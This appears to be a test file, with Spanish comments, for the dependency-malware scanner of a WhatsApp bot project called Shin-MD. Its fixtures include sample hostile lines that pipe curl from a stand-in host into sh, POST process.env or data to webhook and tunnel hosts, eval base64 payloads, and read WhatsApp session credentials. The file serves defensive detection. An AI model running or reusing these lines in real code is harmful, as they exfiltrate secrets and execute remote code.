/**
 * Shin-MD - https://github.com/riokuroxi-svg/Shin-MD
 * Copyright (C) 2026 riokuroxi-svg
 * SPDX-License-Identifier: AGPL-3.0-only
 * Parte de Shin-MD. Mantener este header es obligatorio por AGPL.
 */
// ═══════════════════════════════════════════════════════════════════
//  analisis-dependencias.test.js — CAPAS 2 y 3
//
//  El sello de la capa 1 dice «esto cambió». Estas pruebas son para lo
//  otro: que el análisis diga «esto se parece a un robo» y que la cadena
//  de suministro diga «este paquete no es lo que dice ser».
//
//  Todo con paquetes de mentira en un directorio temporal: no se toca el
//  node_modules real ni se necesita red.
// ═══════════════════════════════════════════════════════════════════

import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";

import {
  analizarTexto,
  analizarArchivo,
  analizarContenido,
  analizarCadena,
  analizarInstalacion,
  REGLAS,
} from "#lib/analisis-dependencias";

function temporal() {
  return fs.mkdtempSync(path.join(os.tmpdir(), "shin-analisis-"));
}

function escribir(dir, rel, contenido) {
  const abs = path.join(dir, rel);
  fs.mkdirSync(path.dirname(abs), { recursive: true });
  fs.writeFileSync(abs, contenido);
  return abs;
}

const reglasDe = (hallazgos) => hallazgos.map((h) => h.regla);

// ─────────────────────────── contenido ───────────────────────────

test("eval sobre base64 se marca como señal alta", () => {
  const codigo = `
    const payload = Buffer.from("ZG9jdW1lbnQ=", "base64").toString();
    eval(payload);
  `;
  const h = analizarTexto(codigo, { archivo: "node_modules/x/y.js" });
  assert.ok(reglasDe(h).includes("eval-ofuscado"));
  assert.equal(h.find((x) => x.regla === "eval-ofuscado").gravedad, "alta");
});

test("hablar con un webhook de Discord se marca como exfiltración", () => {
  const codigo = `fetch("https://discord.com/api/webhooks/123/abc", { method: "POST", body: datos });`;
  assert.ok(reglasDe(analizarTexto(codigo, { archivo: "x.js" })).includes("exfiltracion"));
});

test("un túnel (ngrok, interactsh) también cuenta como exfiltración", () => {
  for (const url of ["https://abc123.ngrok.io/x", "https://algo.oast.fun/y"]) {
    assert.ok(
      reglasDe(analizarTexto(`fetch("${url}")`, { archivo: "x.js" })).includes("exfiltracion"),
      "no detectó " + url
    );
  }
});

test("mirar la sesión de WhatsApp desde una dependencia es señal alta", () => {
  const codigo = `
    const fs = require("fs");
    const datos = fs.readFileSync("./Sessions/Owner/auth.creds", "utf8");
  `;
  const h = analizarTexto(codigo, { archivo: "node_modules/malo/index.js" });
  assert.equal(h.find((x) => x.regla === "sesion-whatsapp")?.gravedad, "alta");
});

test("curl dentro de un proceso es el patrón de un instalador troyanizado", () => {
  const codigo = `require("child_process").execSync("curl -s https://malo.tld/x.sh | sh");`;
  assert.ok(reglasDe(analizarTexto(codigo, { archivo: "x.js" })).includes("shell-y-red"));
});

test("mandar process.env fuera se marca", () => {
  const codigo = `fetch("https://recoge.tld", { body: JSON.stringify(process.env) });`;
  assert.ok(reglasDe(analizarTexto(codigo, { archivo: "x.js" })).includes("entorno-exfiltrado"));
});

test("código normal del bot no dispara nada", () => {
  const limpio = `
    import fs from "node:fs";
    export function saludar(nombre) {
      const total = process.env.PORT || 3000;
      return "hola " + nombre + " (" + total + ")";
    }
    // Se lee el archivo de configuración del propio proyecto.
    fs.existsSync("data/shin.db");
  `;
  assert.deepEqual(analizarTexto(limpio, { archivo: "src/lib/x.js" }), []);
});

test("solo se leen extensiones de texto y se respeta el tamaño", () => {
  const dir = temporal();
  const png = escribir(dir, "node_modules/x/logo.png", "no-es-texto");
  assert.deepEqual(analizarArchivo(png, { raiz: dir }), []);

  const grande = escribir(dir, "node_modules/x/grande.js", "a".repeat(1024 * 1024 + 10));
  assert.deepEqual(analizarArchivo(grande, { raiz: dir }), []);
});

test("analizarContenido informa cuántos archivos miró de verdad", () => {
  const dir = temporal();
  escribir(dir, "node_modules/uno/index.js", "module.exports = 1;");
  escribir(dir, "node_modules/dos/index.js", "eval(Buffer.from('eA==','base64').toString())");
  escribir(dir, "node_modules/tres/README.md", "# nada");
  const r = analizarContenido({ raiz: dir });
  assert.equal(r.analizados, 2, "los .md no se analizan como código");
  assert.equal(r.hallazgos.length, 1);
  assert.equal(r.hallazgos[0].archivo, "node_modules/dos/index.js");
});

test("con `solo` se revisa únicamente lo que cambió", () => {
  const dir = temporal();
  escribir(dir, "node_modules/uno/index.js", "module.exports = 1;");
  escribir(dir, "node_modules/dos/index.js", "eval(Buffer.from('eA==','base64').toString())");
  const r = analizarContenido({ raiz: dir, solo: ["uno/index.js"] });
  assert.equal(r.analizados, 1);
  assert.deepEqual(r.hallazgos, []);
});

test("cada regla declara su gravedad y una razón legible", () => {
  for (const regla of REGLAS) {
    assert.ok(["alta", "media", "baja"].includes(regla.gravedad), regla.id);
    assert.ok(regla.descripcion.length > 10, regla.id + " sin explicación");
    assert.equal(typeof regla.prueba(""), "boolean");
  }
});

// ────────────────────── cadena de suministro ──────────────────────

/** Proyecto con lock y node_modules coherentes, listo para romperlo. */
function cadena({ paquetes = {}, instalados = {}, lockExtra = {} } = {}) {
  const dir = temporal();
  fs.writeFileSync(
    path.join(dir, "package.json"),
    JSON.stringify({ name: "bot", version: "1.0.0" })
  );
  const packages = {
    "": { name: "bot", version: "1.0.0" },
    "node_modules/bueno": {
      version: "1.0.0",
      resolved: "https://registry.npmjs.org/bueno/-/bueno-1.0.0.tgz",
      integrity: "sha512-abc",
      ...lockExtra.bueno,
    },
  };
  for (const [nombre, info] of Object.entries(paquetes)) {
    packages["node_modules/" + nombre] = {
      version: "1.0.0",
      resolved: "https://registry.npmjs.org/" + nombre + "/-/" + nombre + "-1.0.0.tgz",
      integrity: "sha512-xyz",
      ...info,
    };
  }
  fs.writeFileSync(
    path.join(dir, "package-lock.json"),
    JSON.stringify({ lockfileVersion: 3, packages })
  );

  for (const [nombre, pj] of Object.entries({
    bueno: { name: "bueno", version: "1.0.0" },
    ...instalados,
  })) {
    escribir(dir, "node_modules/" + nombre + "/package.json", JSON.stringify(pj));
  }
  return dir;
}

test("un paquete que se descarga de un registro ajeno salta como alto", () => {
  const dir = cadena({ paquetes: { raro: { resolved: "https://npm.malo.tld/raro-1.0.0.tgz" } } });
  const r = analizarCadena({ raiz: dir });
  const h = r.hallazgos.find((x) => x.regla === "registro-ajeno");
  assert.ok(h, "no detectó el registro ajeno");
  assert.equal(h.gravedad, "alta");
  assert.match(h.descripcion, /npm\.malo\.tld/);
});

test("una descarga por HTTP sin cifrar es señal alta", () => {
  const dir = cadena({
    paquetes: { feo: { resolved: "http://registry.npmjs.org/feo/-/feo-1.0.0.tgz" } },
  });
  assert.ok(analizarCadena({ raiz: dir }).hallazgos.some((h) => h.regla === "registro-inseguro"));
});

test("un paquete instalado que no está en el lock se nota", () => {
  const dir = cadena({ instalados: { intruso: { name: "intruso", version: "9.9.9" } } });
  const h = analizarCadena({ raiz: dir }).hallazgos.find((x) => x.regla === "paquete-no-declarado");
  assert.ok(h);
  assert.match(h.descripcion, /intruso/);
});

test("un paquete que dice ser otro por dentro se marca como identidad cambiada", () => {
  const dir = cadena({ instalados: { bueno: { name: "otro-paquete", version: "1.0.0" } } });
  const h = analizarCadena({ raiz: dir }).hallazgos.find((x) => x.regla === "identidad-cambiada");
  assert.ok(h);
  assert.equal(h.gravedad, "alta");
});

test("un script de instalación fuera de la lista explicada se avisa", () => {
  const dir = cadena({
    paquetes: { lista: { hasInstallScript: true } },
    instalados: {
      lista: { name: "lista", version: "1.0.0", scripts: { postinstall: "node x.js" } },
    },
  });
  const hallazgos = analizarCadena({ raiz: dir }).hallazgos.filter(
    (h) => h.regla === "script-de-instalacion"
  );
  assert.ok(hallazgos.length >= 1);
  assert.match(hallazgos[0].descripcion, /lista/);
});

test("los paquetes con script explicado no generan aviso", () => {
  const dir = cadena({
    paquetes: { sharp: { hasInstallScript: true } },
    instalados: {
      sharp: { name: "sharp", version: "1.0.0", scripts: { install: "node install.js" } },
    },
  });
  assert.equal(
    analizarCadena({ raiz: dir }).hallazgos.filter((h) => h.regla === "script-de-instalacion")
      .length,
    0
  );
});

test("sin lockfile legible se dice, en vez de fingir que todo está bien", () => {
  const dir = temporal();
  const r = analizarCadena({ raiz: dir });
  assert.equal(r.hallazgos[0].regla, "sin-lockfile");
});

test("analizarInstalacion resume por gravedad y dice si está limpio", () => {
  const dir = cadena();
  const limpio = analizarInstalacion({ raiz: dir });
  assert.equal(
    limpio.limpio,
    true,
    "un árbol coherente no debe generar hallazgos: " + JSON.stringify(limpio.hallazgos)
  );

  escribir(dir, "node_modules/bueno/index.js", "eval(Buffer.from('eA==','base64').toString())");
  const sucio = analizarInstalacion({ raiz: dir });
  assert.equal(sucio.limpio, false);
  assert.equal(sucio.resumen.alta, 1);
  assert.equal(sucio.hallazgos[0].archivo, "node_modules/bueno/index.js");
});
